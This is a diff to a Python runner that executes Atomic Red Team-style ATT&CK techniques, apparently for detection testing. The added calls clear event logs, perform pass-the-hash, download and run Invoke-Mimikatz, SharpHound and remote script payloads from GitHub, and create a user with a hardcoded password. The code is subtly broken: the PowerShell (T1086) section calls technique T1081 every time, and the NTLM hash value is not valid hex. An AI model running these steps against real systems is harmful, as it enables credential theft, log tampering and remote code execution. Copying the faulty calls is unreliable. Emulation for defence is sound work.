@@ -158,10 +158,76 @@ def main():
     # If running test, fill out hostname field
     #techniques.execute("T1062", position=0, parameters={'hostname': 'REPLACE-ME', 'vm_name': 'testvm', 'file_location': 'C:\\Temp\\test.vhdx'})
 
-    # T1063 -
+    # T1063 - Security Software Discovery
+    techniques.execute("T1063", position=0, parameters={})
+    techniques.execute("T1063", position=1, parameters={})
+    techniques.execute("T1063", position=2, parameters={})
 
+    # T1064 - Scripting
+    #techniques.execute("T1064", position=0, parameters={})  #Linux/Mac technique
 
+    # T1065 - Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls
+    techniques.execute("T1065", position=0, parameters={'port': '8081', 'domain': 'google.com'})
 
+    # T1069 - Permission Groups Discovery
+    techniques.execute("T1069", position=0, parameters={})
+    techniques.execute("T1069", position=1, parameters={'user': 'administrator'})
+
+    # T1070 - Indicator Removal on Host
+    techniques.execute("T1070", position=0, parameters={'log_name': 'System'})
+    techniques.execute("T1070", position=1, parameters={})
+
+    # T1071 - Standard Application Layer Protocol
+    techniques.execute("T1071", position=0, parameters={'domain': 'www.google.com'})
+
+    # T1074 - Data Staged
+    #techniques.execute("T1074", position=0, parameters={})  #Linux/Mac technique
+
+    # T1075 - Pass the Hash
+    techniques.execute("T1075", position=0, parameters={'user_name': "REPLACE-ME", 'domain': 'REPLACE-ME', 'ntlm': 'cc36cf7a8514893efccd3324464tkg1a'})
+    techniques.execute("T1075", position=1, parameters={'user_name': "REPLACE-ME", 'domain': 'REPLACE-ME'})
+
+    # T1076 - Remote Desktop Protocol
+    techniques.execute("T1076", position=0, parameters={})
+
+    # T1077 - Windows Admin Shares
+    # Test commented out, as they require connection to external host or data store
+    # If running tests, fill in networking and authentication information
+    #techniques.execute("T1077", position=0, parameters={'share_name': 'C$', 'user_name': 'REPLACE-ME', 'password': 'REPLACE-ME', 'computer_name': 'REPLACE-ME'})
+    #techniques.execute("T1077", position=1, parameters={'share_name': 'C$', 'computer_name': 'REPLACE-ME', 'map_name': 'REPLACE-ME (mapped drive letter'})
+
+    # T1081 - Credential in Files
+    techniques.execute("T1081", position=0, parameters={})
+    techniques.execute("T1081", position=1, parameters={})
+
+    # T1082 - System Information Discovery
+    techniques.execute("T1082", position=0, parameters={})
+
+    # T1083 - File and Directory Discovery
+    techniques.execute("T1083", position=0, parameters={})
+    techniques.execute("T1083", position=1, parameters={})
+
+    # T1084 - Windows Management Instrumentation Event Subscription
+    techniques.execute("T1084", position=0, parameters={})
+    techniques.execute("T1084", position=1, parameters={})
+
+    # T1085 - Rundll32
+    techniques.execute("T1085", position=0, parameters={'file_url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct'})
+
+    # T1086 - PowerShell
+    techniques.execute("T1081", position=0, parameters={'mimurl': 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'})
+    techniques.execute("T1081", position=1, parameters={'bloodurl': 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'})
+    techniques.execute("T1081", position=2, parameters={})
+    techniques.execute("T1081", position=3, parameters={})
+    techniques.execute("T1081", position=4, parameters={})
+    techniques.execute("T1081", position=5, parameters={'user_name': 'atomic_user', 'full_name': 'Atomic Red Team', 'password': 'ATOM1CR3DT3@M', 'description': 'Test user created via powershell using red canary scripts'})
+    techniques.execute("T1081", position=6, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1'})
+    techniques.execute("T1081", position=7, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1'})
+    techniques.execute("T1081", position=8, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml'})
+    techniques.execute("T1081", position=9, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct'})
+    techniques.execute("T1081", position=10, parameters={})
+
+    #
 
 
 if __name__ == "__main__":
